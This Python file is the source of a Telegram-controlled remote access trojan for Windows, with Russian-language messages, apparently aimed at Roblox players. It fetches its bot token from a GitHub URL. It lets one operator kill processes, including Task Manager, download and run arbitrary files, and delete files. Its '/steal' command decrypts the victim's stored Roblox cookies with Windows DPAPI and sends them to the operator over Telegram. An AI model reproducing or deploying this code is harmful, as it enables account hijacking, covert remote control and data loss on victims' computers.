import base64
import json
import shutil
from io import BytesIO

import win32crypt
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import subprocess
import requests
import os

TOKEN_URL = "https://raw.githubusercontent.com/wasrecordrecorder/Crosshair/refs/heads/main/dwadawdwadsadwad.txt"

def get_token():
    response = requests.get(TOKEN_URL)
    response.raise_for_status()
    return response.text.strip()

BOT_TOKEN = get_token()
ALLOWED_USER_ID = 1417914108


async def check_access(update: Update):
    if update.effective_user.id != ALLOWED_USER_ID:
        await update.message.reply_text("⛔ Доступ запрещён!")
        return False
    return True


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    await update.message.reply_text(
        "Бот запущен. Доступные команды:\n"
        "/kill_roblox - закрыть Roblox\n"
        "/kill_browser - закрыть браузер\n"
        "/kill_taskmgr - закрыть диспетчер задач\n"
        "/killtask <имя>.exe - закрыть процесс по имени\n" 
        "/download <URL> - скачать файл в <URL> <путь для сохранения>\n"
        "/run <путь> - запустить файл\n"
        "/steal - получить куки Roblox\n"
        "/delfile <путь> - удалить файл"
    )


async def kill_roblox(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    subprocess.run(["taskkill", "/F", "/IM", "RobloxPlayerBeta.exe"], shell=True)
    await update.message.reply_text("Roblox закрыт.")


async def kill_browser(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    subprocess.run(["taskkill", "/F", "/IM", "browser.exe"], shell=True)
    await update.message.reply_text("Браузер закрыт.")


async def kill_taskmgr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    subprocess.run(["taskkill", "/F", "/IM", "taskmgr.exe"], shell=True)
    await update.message.reply_text("Диспетчер задач закрыт.")


async def kill_task(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    if not context.args:
        await update.message.reply_text("Использование: /killtask <имя процесса>.exe")
        return

    process_name = context.args[0]

    try:
        subprocess.run(["taskkill", "/F", "/IM", process_name], shell=True)
        await update.message.reply_text(f"Процесс {process_name} успешно завершён.")
    except Exception as e:
        await update.message.reply_text(f"Ошибка при завершении процесса: {str(e)}")

async def getInfoKeys():
    user_profile = os.getenv("USERPROFILE", "")
    roblox_cookies_path = os.path.join(
        user_profile,
        "AppData",
        "Local",
        "Roblox",
        "LocalStorage",
        "robloxcookies.dat"
    )

    cookies_data = []
    try:
        if os.path.exists(roblox_cookies_path):
            temp_dir = os.getenv("TEMP", "")
            destination_path = os.path.join(temp_dir, "RobloxCookies.dat")
            shutil.copy(roblox_cookies_path, destination_path)
            with open(destination_path, 'r', encoding='utf-8') as file:
                file_content = json.load(file)
                encoded_cookies = file_content.get("CookiesData", "")
                if encoded_cookies:
                    decoded_cookies = base64.b64decode(encoded_cookies)
                    decrypted_cookies = win32crypt.CryptUnprotectData(
                        decoded_cookies,
                        None,
                        None,
                        None,
                        0
                    )[1]
                    cookies_data = decrypted_cookies.decode('utf-8', errors='ignore')
            os.remove(destination_path)
        return cookies_data
    except Exception as e:
        print(f"")
        return []


async def recieveData(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    await update.message.reply_text("Получаю куки Roblox...")

    try:
        data = {
            "roblox_cookies": await getInfoKeys()
        }

        files = {
            'roblox_cookies.json': BytesIO(json.dumps(data["roblox_cookies"], indent=4).encode())
        }

        await update.message.reply_document(
            document=files['roblox_cookies.json'],
            filename='roblox_cookies.json'
        )
    except Exception as e:
        await update.message.reply_text(f"Ошибка при получении куки: {str(e)}")


async def download(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    if len(context.args) < 2:
        await update.message.reply_text("Использование: /download <URL> <путь для сохранения>")
        return

    url = context.args[0]
    path = context.args[1]

    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()

        os.makedirs(os.path.dirname(path), exist_ok=True)

        with open(path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)

        await update.message.reply_text(f"Файл успешно скачан и сохранён по пути: {path}")
    except Exception as e:
        await update.message.reply_text(f"Ошибка при скачивании файла: {str(e)}")


async def run_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    if not context.args:
        await update.message.reply_text("Использование: /run <путь к файлу>")
        return

    path = ' '.join(context.args)

    try:
        if os.path.exists(path):
            if os.name == 'nt':
                os.startfile(path)
            else:
                subprocess.run(['xdg-open', path])
            await update.message.reply_text(f"Файл {path} успешно запущен")
        else:
            await update.message.reply_text(f"Файл не найден по пути: {path}")
    except Exception as e:
        await update.message.reply_text(f"Ошибка при запуске файла: {str(e)}")


async def delete_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update):
        return

    if not context.args:
        await update.message.reply_text("Использование: /delfile <путь к файлу>")
        return

    path = ' '.join(context.args)

    try:
        if os.path.exists(path):
            if os.path.isfile(path):
                os.remove(path)
                await update.message.reply_text(f"Файл {path} успешно удалён")
            else:
                await update.message.reply_text(f"Указанный путь не является файлом: {path}")
        else:
            await update.message.reply_text(f"Файл не найден по пути: {path}")
    except Exception as e:
        await update.message.reply_text(f"Ошибка при удалении файла: {str(e)}")


app = ApplicationBuilder().token(BOT_TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("kill_roblox", kill_roblox))
app.add_handler(CommandHandler("kill_browser", kill_browser))
app.add_handler(CommandHandler("kill_taskmgr", kill_taskmgr))
app.add_handler(CommandHandler("download", download))
app.add_handler(CommandHandler("steal", recieveData))
app.add_handler(CommandHandler("run", run_file))
app.add_handler(CommandHandler("delfile", delete_file))
app.add_handler(CommandHandler("killtask", kill_task))

app.run_polling()
